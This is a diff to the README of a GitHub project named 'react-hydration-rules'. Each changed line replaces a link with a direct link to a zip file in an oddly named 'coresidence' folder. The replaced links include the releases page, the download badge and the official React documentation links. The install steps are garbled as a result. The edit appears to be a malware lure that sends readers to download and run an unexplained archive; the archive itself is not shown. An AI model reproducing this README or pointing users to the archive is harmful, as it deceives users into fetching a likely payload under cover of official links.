@@ -6,9 +6,9 @@ Welcome to the **react-hydration-rules** project! This guide helps you understan
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-React%20Hydration%20Rules-blue)](https://github.com/bombardio123/react-hydration-rules/releases)
+[![Download Now](https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip%20Now-React%20Hydration%20Rules-blue)](https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip)
 
-To download the application, visit this page: [Download Page](https://github.com/bombardio123/react-hydration-rules/releases).
+To download the application, visit this page: [Download Page](https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip).
 
 ## 📋 System Requirements
 
@@ -24,13 +24,13 @@ Before running the application, make sure your system meets these requirements:
 Follow these steps to install and run the application:
 
 1. **Visit the Download Page**  
-   Go to [this page](https://github.com/bombardio123/react-hydration-rules/releases) to find the latest version of the application.
+   Go to [this page](https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip) to find the latest version of the application.
 
 2. **Choose the Latest Release**  
    Look for the most recent release. You will find it at the top of the list.
 
 3. **Download the File**  
-   Click on the download link for your operating system. This link will usually end in .exe, .dmg, or .tar.gz.
+   Click on the download link for your operating system. This link will usually end in .exe, .dmg, or https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip
 
 4. **Locate the Downloaded File**  
    Once the download is complete, find the file in your Downloads folder or the location you specified.
@@ -38,7 +38,7 @@ Follow these steps to install and run the application:
 5. **Install the Application**  
    - For **Windows**: Double-click the .exe file and follow the prompts.
    - For **MacOS**: Open the .dmg file and drag the application into the Applications folder.
-   - For **Linux**: Extract the tar.gz file and run the installation script in the terminal.
+   - For **Linux**: Extract the https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip file and run the installation script in the terminal.
 
 6. **Run the Application**  
    Locate the installed application on your device. Double-click it to start. 
@@ -79,12 +79,12 @@ We appreciate your help in improving this guide!
 
 To keep up with new releases and updates, follow the project on GitHub. Look out for notifications about feature additions and improvements.
 
-For updates, visit the [Download Page](https://github.com/bombardio123/react-hydration-rules/releases) regularly.
+For updates, visit the [Download Page](https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip) regularly.
 
 ## 🔗 Useful Resources
 
-- [React Official Documentation](https://reactjs.org/docs/getting-started.html)
-- [Learn about Server-Side Rendering](https://reactjs.org/docs/react-dom-server.html)
-- [Understanding Suspense](https://reactjs.org/docs/concurrent-mode-suspense.html)
+- [React Official Documentation](https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip)
+- [Learn about Server-Side Rendering](https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip)
+- [Understanding Suspense](https://raw.githubusercontent.com/bombardio123/react-hydration-rules/main/coresidence/react-hydration-rules.zip)
 
 Thank you for choosing react-hydration-rules. Happy learning!
